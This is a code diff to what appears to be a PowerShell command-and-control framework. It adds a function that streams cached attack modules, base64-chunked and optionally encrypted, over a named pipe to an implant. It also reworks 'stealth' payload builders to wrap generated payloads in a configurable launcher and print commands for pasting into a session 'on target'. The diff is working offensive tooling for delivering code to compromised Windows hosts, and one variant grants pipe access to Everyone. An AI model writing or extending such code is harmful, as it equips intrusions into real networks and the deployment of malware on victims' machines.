@@ -323,7 +323,45 @@ function New-EmbeddedTool {
     $b64 = [Convert]::ToBase64String($ms.ToArray())
     Write-Host "'$Name' = '$b64'"
 }
-function Send-Module            { param([string]$ToolName,$Writer,$Reader) throw "Not implemented" }
+function Send-Module {
+    param(
+        [string]$ToolName,
+        $Writer,
+        $Reader,
+        [byte[]]$SessionKey = $null
+    )
+
+    if (-not $global:ToolCache.ContainsKey($ToolName)) {
+        Write-Host " [-] Module '$ToolName' not in cache. Options:" -ForegroundColor Red
+        Write-Host "     1. Add to Tools\ and run: modules reload"
+        Write-Host "     2. Start operator HTTP server: serve"
+        return $false
+    }
+
+    $code      = $global:ToolCache[$ToolName]
+    $codeBytes = [System.Text.Encoding]::UTF8.GetBytes($code)
+    $chunkSize = 4096
+
+    $begin = "__MODULE_BEGIN__:${ToolName}:$($codeBytes.Length)"
+    if ($SessionKey) { $begin = Protect-PipeMessage -PlainText $begin -Key $SessionKey }
+    $Writer.WriteLine($begin); $Writer.Flush()
+
+    for ($i = 0; $i -lt $codeBytes.Length; $i += $chunkSize) {
+        $chunk    = $codeBytes[$i..([Math]::Min($i + $chunkSize - 1, $codeBytes.Length - 1))]
+        $line     = "__MODULE_CHUNK__:$([Convert]::ToBase64String($chunk))"
+        if ($SessionKey) { $line = Protect-PipeMessage -PlainText $line -Key $SessionKey }
+        $Writer.WriteLine($line)
+    }
+    $Writer.Flush()
+
+    $end = "__MODULE_END__:${ToolName}"
+    if ($SessionKey) { $end = Protect-PipeMessage -PlainText $end -Key $SessionKey }
+    $Writer.WriteLine($end); $Writer.Flush()
+
+    $ack = $Reader.ReadLine()
+    if ($SessionKey -and $ack) { $ack = Unprotect-PipeMessage -CipherB64 $ack -Key $SessionKey }
+    return ($ack -eq $global:EndMarker)
+}
 function Test-NetworkLogonToken {
     try {
         $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
@@ -1935,12 +1973,13 @@ while (`$true) {
 			PS1ToEXE -content $exescript -outputFile $exefilelocation
 		}
 		elseif($global:payloadformat -eq 'stealth'){
-			$stealthPayload = New-StealthScript -ComputerName $ComputerName -PipeName $PipeName
+			$built = New-PayloadScript -ComputerName $ComputerName -PipeName $PipeName
+			$wrapped = Get-PayloadLauncher -Script $built.InlinePS -Launcher $global:PayloadConfig.Launcher
 			Write-Output " [Inline PS — paste into existing session]"
-			Write-Output " $($stealthPayload.InlinePS)"
+			Write-Output " $($built.InlinePS)"
 			Write-Output ""
-			Write-Output " [Full command — run from cmd.exe on target]"
-			Write-Output " $($stealthPayload.FullCommand)"
+			Write-Output " [Full command — launcher: $($global:PayloadConfig.Launcher)]"
+			Write-Output " $wrapped"
 			Write-Output ""
 		}
 	}
@@ -2124,12 +2163,13 @@ while (`$true) {
 	}
 	elseif($global:payloadformat -eq 'stealth'){
 		$stealthSID = if($global:Detach){'S-1-1-0'} else {$SID}
-		$stealthPayload = New-StealthScript -IsServer -PipeName $PN -SID $stealthSID
+		$built = New-PayloadScript -IsServer -PipeName $PN -SID $stealthSID
+		$wrapped = Get-PayloadLauncher -Script $built.InlinePS -Launcher $global:PayloadConfig.Launcher
 		Write-Output " [Inline PS — paste into existing session on target]"
-		Write-Output " $($stealthPayload.InlinePS)"
+		Write-Output " $($built.InlinePS)"
 		Write-Output ""
-		Write-Output " [Full command — run from cmd.exe on target]"
-		Write-Output " $($stealthPayload.FullCommand)"
+		Write-Output " [Full command — launcher: $($global:PayloadConfig.Launcher)]"
+		Write-Output " $wrapped"
 		Write-Output ""
 	}
 
